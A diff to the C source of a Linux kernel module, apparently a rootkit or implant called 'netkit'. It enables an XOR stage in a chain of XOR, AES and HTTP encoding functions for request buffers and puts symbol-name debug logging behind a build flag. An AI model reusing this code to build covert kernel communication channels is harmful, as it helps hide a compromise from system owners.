@@ -4,13 +4,15 @@
 #include <linux/types.h>
 #include <linux/kallsyms.h>
 
-#include "xor/xor.h"
-#include "aes/aes.h"
-#include "http/http.h"
-
 #include "../sys/debug.h"
 #include "../sys/mem.h"
 #include "../core/iface.h"
+
+static inline int call_next_encoding(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);
+
+#include "xor/xor.h"
+#include "aes/aes.h"
+#include "http/http.h"
 
 static inline int enc_last_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
 {
@@ -19,15 +21,18 @@ static inline int enc_last_process(const u8 *req_buf, size_t req_buflen, u8 **re
 
 static int (*ENC_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index) = {
     //enc_aes_process,
-    //enc_xor_process,
+    enc_xor_process,
     enc_http_process,
     enc_last_process
 };
 
+
 static inline int call_next_encoding(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
 {
-    char *sym_name;
     int retv;
+
+#if CONFIG_NETKIT_DEBUG
+    char *sym_name;
 
     // for some reason symbol names are this big???
     sym_name = kzmalloc(1024, GFP_KERNEL);
@@ -39,13 +44,18 @@ static inline int call_next_encoding(const u8 *req_buf, size_t req_buflen, u8 **
         return retv;
 
     NETKIT_LOG("[*] calling '%s' (req_buflen: %lu)\n", sym_name, req_buflen);
+#endif
     retv = ENC_FUNCTIONS[index](req_buf, req_buflen, res_buf, res_buflen, index);
+#if CONFIG_NETKIT_DEBUG
     NETKIT_LOG("[+] returned '%s' (res_buflen: %lu, retv: %d)\n", sym_name, *res_buflen, retv);
 
     kzfree(sym_name, 1024);
+#endif
 
     return retv;
 }
+
+//extern int (*ENC_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);
 
 static inline int enc_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
